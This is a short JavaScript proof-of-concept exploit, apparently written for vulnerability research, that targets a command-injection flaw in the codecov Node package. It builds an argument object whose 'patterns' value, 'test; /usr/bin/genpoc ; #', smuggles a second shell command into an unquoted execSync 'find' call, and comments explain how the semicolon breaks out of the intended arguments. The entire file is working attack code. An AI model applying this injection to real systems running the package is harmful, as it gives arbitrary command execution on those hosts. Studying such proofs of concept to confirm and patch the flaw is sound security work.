async function exploit() {
   // The 'patterns' option is directly interpolated into the unquoted string of 
   // `execSync('find ...')` in lib/codecov.js without shell escaping or proper quoting.
   // By providing a semicolon (;) followed by our target binary, we can terminate 
   // the intended search arguments and force the underlying /bin/sh to execute arbitrary commands.

   const maliciousPayload = "test; /usr/bin/genpoc ; #";

   console.log('[*] Triggering command injection via crafted search patterns...');

   // Constructing the arguments object as expected by lib/codecov.js#upload()
   var args = {
     options: {
       root: process.cwd(),
       disable: ['detect', 'gcov'], // Disable irrelevant parts to focus on search logic
       // Inject our payload directly. Passing it here allows it to propagate into the vulnerable shell execution context.
       patterns: [maliciousPayload] 
     }
   };

   // Invoke upload directly since handleInput caused API binding errors previously.
   await codecov.upload(args);
}

await exploit();
